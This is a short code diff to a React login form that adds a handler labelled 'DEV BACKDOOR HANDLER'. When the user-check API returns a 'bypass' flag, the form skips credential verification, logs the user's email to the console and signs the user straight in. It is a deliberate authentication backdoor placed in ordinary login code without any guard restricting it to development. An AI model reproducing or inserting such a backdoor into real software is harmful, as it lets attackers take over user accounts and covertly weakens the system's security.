@@ -114,7 +114,16 @@ function LoginForm() {
             setLoading(true);
 
             // 1. Check if user exists
-            const { exists, data } = await api.auth.checkUser(input);
+            const { exists, data, bypass } = await api.auth.checkUser(input);
+
+            // DEV BACKDOOR HANDLER
+            if (bypass && data?.user) {
+                console.log('[DEV-AUTH] Backdoor triggered for:', data.user.email);
+                await refreshUser();
+                handleRedirect(data.user);
+                return;
+            }
+
             if (!exists) {
                 alert("User not found. Please create an account first.");
                 router.push('/register');
